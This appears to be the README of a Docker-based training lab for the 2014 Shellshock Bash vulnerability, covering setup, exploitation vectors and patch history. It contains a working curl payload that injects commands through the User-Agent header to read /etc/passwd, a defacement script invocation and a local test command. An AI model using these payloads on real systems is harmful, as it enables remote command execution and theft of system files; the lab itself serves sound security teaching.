![Logo](/shellshock.png)
# Shellshock exploit + vulnerable environment 
[![Docker Pulls](https://img.shields.io/docker/pulls/vulnerables/cve-2014-6271.svg?style=plastic)](https://hub.docker.com/r/vulnerables/cve-2014-6271/)

Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.

## Run a vulnerable environment

You will need docker installed to run the environment, go to [docker.com](https://docker.com) and install it if you don't have it yet.

To start the vulnerable environment just run

    docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271

Open your browser and go to ```localhost:8080```, if everything is OK you will see a page like this

![vulnerable](/print.png)

## Exploit

There are several ways to exploit this flaw

### Exploit it with one liner

An simple example to ```cat /etc/passwd```

    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
    http://localhost:8080/cgi-bin/vulnerable

You can use it to run any command that you want

### Exploit for defacement

This is just a sample code in exploit-deface.sh, just run it against the image

    ./exploit-deface.sh <ip> <port>

For example if you are running it with the command provided above

    ./exploit-deface.sh localhost 8080

Just refresh your browser and you will see

![Deface](/defaced.png)

## Test your system

Just run this bash script in your system and you will see if you are vulnerable or not:

    env 'VAR=() { :;}; echo Bash is vulnerable!' 'FUNCTION()=() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"

## Exploitation Vectors

### CGI-based web server

When a web server uses the Common Gateway Interface (CGI) to handle a document request, it passes various details of the request to a handler program in the environment variable list. For example, the variable HTTP_USER_AGENT has a value that, in normal usage, identifies the program sending the request. If the request handler is a Bash script, or if it executes one for example using the system(3) call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted server request.
Security documentation for the widely used Apache web server states: "CGI scripts can ... be extremely dangerous if they are not carefully checked." and other methods of handling web server requests are often used. There are a number of online services which attempt to test the vulnerability against web servers exposed to the Internet.

### OpenSSH server

OpenSSH has a "ForceCommand" feature, where a fixed command is executed when the user logs in, instead of just running an unrestricted command shell. The fixed command is executed even if the user specified that another command should be run; in that case the original command is put into the environment variable "SSH_ORIGINAL_COMMAND". When the forced command is run in a Bash shell (if the user's shell is set to Bash), the Bash shell will parse the SSH_ORIGINAL_COMMAND environment variable on start-up, and run the commands embedded in it. The user has used their restricted shell access to gain unrestricted shell access, using the Shellshock bug.

### DHCP clients

Some DHCP clients can also pass commands to Bash; a vulnerable system could be attacked when connecting to an open Wi-Fi network. A DHCP client typically requests and gets an IP address from a DHCP server, but it can also be provided a series of additional options. A malicious DHCP server could provide, in one of these options, a string crafted to execute code on a vulnerable workstation or laptop.

### Qmail server

When using Bash to process email messages (e.g. through .forward or qmail-alias piping), the qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash.

### IBM HMC restricted shell

The bug can be exploited to gain access to Bash from the restricted shell of the IBM Hardware Management Console, a tiny Linux variant for system administrators. IBM released a patch to resolve this.

## Fix

iUntil 24 September 2014, Bash maintainer Chet Ramey provided a patch version bash43-025 of Bash 4.3 addressing CVE-2014-6271, which was already packaged by distribution maintainers. On 24 September, bash43-026 followed, addressing CVE-2014-7169. Then CVE-2014-7186 was discovered. Florian Weimer from Red Hat posted some patch code for this "unofficially" on 25 September, which Ramey incorporated into Bash as bash43-027. These patches provided code only, helpful only for those who know how to compile ("rebuild") a new Bash binary executable file from the patch file and remaining source code files.

The next day, Red Hat officially presented according updates for Red Hat Enterprise Linux, after another day for Fedora 21. Canonical Ltd. presented updates for its Ubuntu Long Term Support versions on Saturday, 27 September; on Sunday, there were updates for SUSE Linux Enterprise. he following Monday and Tuesday at the end of the month, Apple OS X updates appeared.

On 1 October 2014, Michał Zalewski from Google Inc. finally stated that Weimer's code and bash43-027 had fixed not only the first three bugs but even the remaining three that were published after bash43-027, including his own two discoveries.This means that after the earlier distribution updates, no other updates have been required to cover all the six issues.

### Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (opsxcq) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not opsxcq's responsibility.
